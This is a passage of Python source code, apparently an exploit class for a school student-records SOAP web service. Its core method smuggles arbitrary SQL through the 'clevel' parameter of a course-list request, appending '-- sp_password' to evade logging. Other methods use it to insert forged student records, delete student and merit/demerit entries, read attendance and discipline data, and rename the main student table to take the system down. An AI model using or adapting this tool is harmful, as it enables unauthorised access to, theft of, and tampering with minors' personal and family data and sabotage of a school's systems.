relationship_with_contact, student_identity, student_english_name, school_code, student_id, student_status_changer, student_status_change_time, contact_cell_phone, contact_name, contact_email, contact_phone_work, contact_phone_home, license_type):
        sql_command = f"INSERT INTO dbo.學籍資料 (學生姓名, 一下座號, 一下班級, 一下學年度, 一上座號, 一上班級, 一上學年度, 二下座號, 二下班級, 二下學年度, 二上座號, 二上班級, 二上學年度, 入學資格, 三下座號, 三下班級, 三下學年度, 三上座號, 三上班級, 三上學年度, 戶口遷入日期, 戶籍地址, 戶籍村里, 戶籍郵遞區號, 戶籍鄉鎮市區, 戶籍路, 戶籍鄰, 戶籍縣市, 父親出生年, 父親存歿, 父親行動電話, 父親姓名, 父親服務單位, 父親電子郵件, 父親電話公, 父親電話宅, 父親職業別, 父親職稱, 出生地, 出生年月日, 母親出生年, 母親存歿, 母親行動電話, 母親姓名, 母親服務單位, 母親電子郵件, 母親電話公, 母親電話宅, 母親職業別, 母親職稱, 在家自學, 在學狀態, 血型, 身分證號碼, 身心障礙核准編號, 性別, 特殊身分編號, 特殊班上課性質, 特殊班班別, 特殊班類別, 班級性質, 國籍, 族群, 現在年級, 現在座號, 現在班級, 畢修業日期, 畢修業字, 畢修業別, 畢修業核准日期, 畢修業核准字, 畢修業核准單位, 畢修業核准號, 畢修業填報日期, 畢修業號, 畢業小學代碼, 畢業小學校名, 通訊地址, 通訊村里, 通訊郵遞區號, 通訊鄉鎮市區, 通訊路, 通訊鄰, 通訊縣市, 僑居地, 監護人行動電話, 監護人姓名, 監護人服務單位, 監護人電子郵件, 監護人電話公, 監護人電話宅, 監護人職業別, 監護人職稱, 與父親關係, 與母親關係, 與監護人關係, 與聯絡人關係, 學生身份別, 學生英文姓名, 學校代碼, 學號, 學籍異動者, 學籍異動時間, 聯絡人行動電話, 聯絡人姓名, 聯絡人電子郵件, 聯絡人電話公, 聯絡人電話宅, 證照種類) VALUES ('{student_name}', '{seat_number_grade_1}', '{class_grade_1}', '{academic_year_grade_1}', '{seat_number_grade_1_up}', '{class_grade_1_up}', '{academic_year_grade_1_up}', '{seat_number_grade_2_down}', '{class_grade_2_down}', '{academic_year_grade_2_down}', '{seat_number_grade_2_up}', '{class_grade_2_up}', '{academic_year_grade_2_up}', '{admission_qualification}', '{seat_number_grade_3_down}', '{class_grade_3_down}', '{academic_year_grade_3_down}', '{seat_number_grade_3_up}', '{class_grade_3_up}', '{academic_year_grade_3_up}', '{date_of_residence_transfer}', '{household_registration_address}', '{household_registration_village}', '{household_registration_postal_code}', '{household_registration_township_city}', '{household_registration_road}', '{household_registration_neighborhood}', '{household_registration_county_city}', '{father_birth_year}', '{father_living_status}', '{father_cell_phone}', '{father_name}', '{father_service_unit}', '{father_email}', '{father_phone_work}', '{father_phone_home}', '{father_occupation_type}', '{father_position}', '{place_of_birth}', '{date_of_birth}', '{mother_birth_year}', '{mother_living_status}', '{mother_cell_phone}', '{mother_name}', '{mother_service_unit}', '{mother_email}', '{mother_phone_work}', '{mother_phone_home}', '{mother_occupation_type}', '{mother_position}', '{homeschooled}', '{enrollment_status}', '{blood_type}', '{id_number}', '{disability_approval_number}', '{gender}', '{special_identity_number}', '{special_class_type}', '{special_class_class}', '{special_class_category}', '{class_property}', '{nationality}', '{ethnicity}', '{current_grade}', '{current_seat_number}', '{current_class}', '{graduation_date}', '{graduation_letter}', '{graduation_type}', '{graduation_approval_date}', '{graduation_approval_letter}', '{graduation_approval_unit}', '{graduation_approval_number}', '{graduation_report_date}', '{graduation_number}', '{primary_school_code}', '{primary_school_name}', '{mailing_address}', '{mailing_village}', '{mailing_postal_code}', '{mailing_township_city}', '{mailing_road}', '{mailing_neighborhood}', '{mailing_county_city}', '{overseas_residence}', '{guardian_cell_phone}', '{guardian_name}', '{guardian_service_unit}', '{guardian_email}', '{guardian_phone_work}', '{guardian_phone_home}', '{guardian_occupation_type}', '{guardian_position}', '{relationship_with_father}', '{relationship_with_mother}', '{relationship_with_guardian}', '{relationship_with_contact}', '{student_identity}', '{student_english_name}', '{school_code}', '{student_id}', '{student_status_changer}', '{student_status_change_time}', '{contact_cell_phone}', '{contact_name}', '{contact_email}', '{contact_phone_work}', '{contact_phone_home}', '{license_type}');"
        res = self._send_sql_command(sql_command)
        
        return res

    def Remove_Student_Info_By_IDNo(self, idno):
        return tnsqli._send_sql_command(f"DELETE FROM dbo.學籍資料 WHERE 身分證號碼 = '{idno}';")

    def Get_MD_By_Sch_And_No(self, sch_code, std_no):
        res = self._send_sql_command(f"SELECT * FROM dbo.Merit_Demerit_Rec WHERE sch_code = '{sch_code}' AND std_no = '{std_no}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def Get_MD_By_Id(self, merit_demerit_rec):
        res = self._send_sql_command(f"SELECT * FROM dbo.Merit_Demerit_Rec WHERE merit_demerit_rec = '{merit_demerit_rec}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]
    
    def Get_MD_By_Sch_And_Type_And_Year(self, sch_code, merit_demerit_type, sch_year):
        res = self._send_sql_command(f"SELECT * FROM dbo.Merit_Demerit_Rec WHERE sch_code = '{sch_code}' AND merit_demerit_type = '{merit_demerit_type}' AND sch_year = '{sch_year}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def Remove_MD_By_Id(self, merit_demerit_rec):
        return tnsqli._send_sql_command(f"DELETE FROM dbo.Merit_Demerit_Rec WHERE merit_demerit_rec = {merit_demerit_rec};")
    
    def Remove_MD_By_Sch_And_No_And_Type(self, sch_code, std_no, merit_demerit_type):
        return tnsqli._send_sql_command(f"DELETE FROM dbo.Merit_Demerit_Rec WHERE merit_demerit_type = {merit_demerit_type} AND sch_code='{sch_code}' AND std_no='{std_no}';")

    def Get_Attendance_Stat(self, sch_code, std_no):
        res = self._send_sql_command(f"SELECT * FROM dbo.Attendance_Statistics WHERE sch_code = '{sch_code}' AND std_no = '{std_no}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]
    
    def Get_MD_Stat(self, sch_code, std_no):
        res = self._send_sql_command(f"SELECT * FROM dbo.Merit_Demerit_Statistics WHERE sch_code = '{sch_code}' AND std_no = '{std_no}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def CrashDB(self):
        return self._send_sql_command("EXEC sp_rename 'dbo.學籍資料', '學籍資料1';")

    def FixDB(self):
        return self._send_sql_command("EXEC sp_rename 'dbo.學籍資料1', '學籍資料';")

    def _send_sql_command(self, sql_command):
        body = f"""<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
                <get_class_course_list xmlns="http://localhost/tnscorews/">
                    <type>1</type>
                    <schcode>4</schcode>
                    <yearho>3</yearho>
                    <udho>2</udho>
                    <clevel>1') ORDER BY 班級配課.班級, 班級配課.領域; {sql_command} -- sp_password </clevel>
                </get_class_course_list>
            </soap:Body>
        </soap:Envelope>"""
        body=body.encode()

        response = requests.post(self.url, data=body, headers=self.headers)
        #print(response.text)
        return response.text
